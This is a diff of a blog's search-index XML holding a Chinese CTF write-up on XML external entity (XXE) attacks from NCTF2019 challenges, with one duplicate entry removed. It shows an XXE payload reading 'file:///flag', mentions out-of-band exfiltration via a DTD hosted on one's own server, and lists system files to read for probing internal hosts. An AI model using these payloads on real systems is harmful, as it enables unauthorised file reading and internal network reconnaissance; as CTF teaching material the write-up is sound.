@@ -2,43 +2,10 @@
 <search>
   <entry>
     <title>初识XML(XXE)</title>
-    <url>/2020/05/13/NCTF2019-%E5%88%9D%E8%AF%86XML/</url>
-    <content><![CDATA[<h3 id="基础知识（https-xz-aliyun-com-t-3357）"><a href="#基础知识（https-xz-aliyun-com-t-3357）" class="headerlink" title="基础知识（https://xz.aliyun.com/t/3357）"></a>基础知识（<a href="https://xz.aliyun.com/t/3357）" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357）</a></h3><p>1.DTD格式规范（元素-&gt;xml标签、实体-&gt;xml内容）</p>
-<p>2.内部引用、外部引用、通用实体、参数实体</p>
-<p>3.参数实体和 “<!--[CDATA["和 “]]-->”可以将读取文件中引起xml格式混乱的字符，多个实体连续引用</p>
-<p>4.有回显、无回显读取敏感文件（无回显可以将dtd放在自己vps上，从而在vps上得到回显）</p>
-<p>5.内网有关（端口扫描、探测内网主机）</p>
-<p>…….</p>
-<h3 id="BUU-Real-PHP-XXE"><a href="#BUU-Real-PHP-XXE" class="headerlink" title="BUU Real [PHP]XXE"></a>BUU Real [PHP]XXE</h3><p>在开这个之前我以为要考点啥难的东西。。么想到就在phpinfo里。。</p>
-<p>但是也让我了解了一些版本问题吧</p>
-<blockquote>
-<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡</p>
-<p>常见触发：</p>
-<p>dom.php # 示例：使用DOMDocument解析body</p>
-<p>SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</p>
-<p>simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</p>
-</blockquote>
-<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>这个题比较基础，flag就放在了/flag下面，直接构造xml用file协议读取就好了</p>
-<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">BTIS</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>0<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>这个题就需要去探测内网了（SSRF）</p>
-<p>可以先尝试读取：<code>/proc/net/arp</code> 或者 <code>/etc/hosts</code> 或者 <code>/etc/network/interfaces</code> </p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:70%;" data-src="/2020/05/13/NCTF2019-%E5%88%9D%E8%AF%86XML/1.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
-      <categories>
-        <category>Write_up</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>XML</tag>
-        <tag>XXE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识XML(XXE)</title>
     <url>/2020/05/13/%E5%88%9D%E8%AF%86XML/</url>
     <content><![CDATA[<h3 id="基础知识（https-xz-aliyun-com-t-3357）"><a href="#基础知识（https-xz-aliyun-com-t-3357）" class="headerlink" title="基础知识（https://xz.aliyun.com/t/3357）"></a>基础知识（<a href="https://xz.aliyun.com/t/3357）" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357）</a></h3><p>1.DTD格式规范（元素-&gt;xml标签，实体-&gt;xml内容）</p>
 <p>2.内部实体、外部实体、通用实体、参数实体</p>
-<p>3.有回显、无回显读取文件（无回显可以把detd放到自己vps上，从而将内容回显到vps上</p>
+<p>3.有回显、无回显读取文件（无回显可以把detd放到自己vps上，从而将内容回显到vps上）</p>
 <p>4.参数实体+ “<!--[CDATA["和 “]]-->”实现连续引用拼接（读取文件时里面有引起xml格式混淆的字符串）</p>
 <p>5.内网相关（端口扫描、内网探测）</p>
 <p>……</p>
@@ -54,15 +21,15 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">BTIS</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>0<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>这里引用上面那篇文张作者的一张图：（常见平台的不同协议）</p>
-<p><a href="/img/loading.gif" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload" title="img"></a></p>
-<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>这个就要用到内网探测了（SSRF？）</p>
+<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload"></a></p>
+<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>这个就要用到内网探测了。（SSRF？）</p>
 <p>我们可以尝试读取：<code>/proc/net/arp</code> 或者 <code>/etc/host</code> 或者 <code>/etc/network/interfaces</code>，来获取内网存活的主机</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/05/13/%E5%88%9D%E8%AF%86XML/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>看到两个，尝试访问一下，第一个好像⑧太行，访问第二个得到flag</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/2.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
+<a href="/2020/05/13/%E5%88%9D%E8%AF%86XML/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML/2.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
       <categories>
-        <category>Write_up</category>
+        <category>Web</category>
       </categories>
       <tags>
         <tag>Web</tag>
